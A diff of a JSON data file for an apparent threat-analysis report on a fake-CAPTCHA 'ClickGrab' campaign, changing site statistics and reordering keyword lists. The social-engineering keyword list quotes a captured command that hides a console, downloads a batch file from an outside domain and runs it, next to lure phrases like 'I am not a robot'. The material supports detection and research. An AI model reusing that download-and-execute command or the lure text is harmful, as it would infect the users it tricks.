@@ -2,7 +2,7 @@
   "title": "Emerging ClickGrab Campaign: Advanced Analysis of 2025-06-17 Attack Patterns",
   "date": "2025-06-17",
   "category": "Threat Analysis",
-  "excerpt": "Comprehensive analysis of 92 sites reveals 12.0% malicious rate with 0 PowerShell attack attempts and 4 clipboard hijacking instances.",
+  "excerpt": "Comprehensive analysis of 92 sites reveals 13.0% malicious rate with 0 PowerShell attack attempts and 4 clipboard hijacking instances.",
   "slug": "clickgrab-analysis-2025-06-17",
   "tags": [
     "URL Analysis",
@@ -12,7 +12,7 @@
   "read_time": 12,
   "stats": {
     "sites_analyzed": 92,
-    "malicious_rate": 12,
+    "malicious_rate": 13,
     "attack_patterns": 7,
     "powershell_downloads": 0,
     "clipboard_manipulations": 4,
@@ -49,8 +49,8 @@
           "count": 4,
           "description": "Executing clipboard copy operations",
           "examples": [
-            "navigator.clipboard",
-            "execCommand(\"copy\""
+            "execCommand(\"copy\"",
+            "navigator.clipboard"
           ]
         },
         "Cleanup Operations": {
@@ -88,26 +88,26 @@
     "keyword_analysis": {
       "categories": {
         "Social Engineering": [
-          "CAPTCHA Verification",
-          "verification",
-          "CaptchaCheckbox",
-          "I am not a robot",
-          "verification-id",
-          "captcha-iogo",
-          "cmd = 'cmd /c start /min cmd.exe /c \"curi -L \"https://pumpfun.exposed/a.cmd\" -o \"%temp%\\\\verification.txt.bat\" && caii \"%temp%\\\\verification.txt.bat\"\"';",
-          "To better prove you are not a robot",
-          "verification_id",
-          "Captcha",
-          "CaptchaListeners",
-          "captcha-container",
-          "robot",
-          "CAPTCHA",
-          "CaptchaLoading",
           "Robot",
+          "CaptchaListeners",
           "Verification",
+          "CaptchaLoading",
+          "verification-id",
+          "verification",
+          "Verify you are human",
+          "captcha-container",
+          "CAPTCHA",
+          "captcha-iogo",
           "Checking if you are human",
           "Verification ID",
-          "Verify you are human",
+          "cmd = 'cmd /c start /min cmd.exe /c \"curi -L \"https://pumpfun.exposed/a.cmd\" -o \"%temp%\\\\verification.txt.bat\" && caii \"%temp%\\\\verification.txt.bat\"\"';",
+          "I am not a robot",
+          "verification_id",
+          "To better prove you are not a robot",
+          "CaptchaCheckbox",
+          "robot",
+          "Captcha",
+          "CAPTCHA Verification",
           "verification ID"
         ],
         "System Commands": [
@@ -118,10 +118,10 @@
         ],
         "Technical Terms": [
           "Ray ID",
-          "iex",
-          ".exe",
           ".bat",
-          "failed_to_retrieve"
+          "iex",
+          "failed_to_retrieve",
+          ".exe"
         ]
       },
       "similar_groups": [
@@ -154,7 +154,7 @@
       "frequency": [
         [
           "failed_to_retrieve",
-          81
+          80
         ],
         [
           "Verification ID",
@@ -234,7 +234,7 @@
         ]
       ],
       "total_unique": 28,
-      "total_count": 114
+      "total_count": 113
     },
     "domain_counts": [
       [
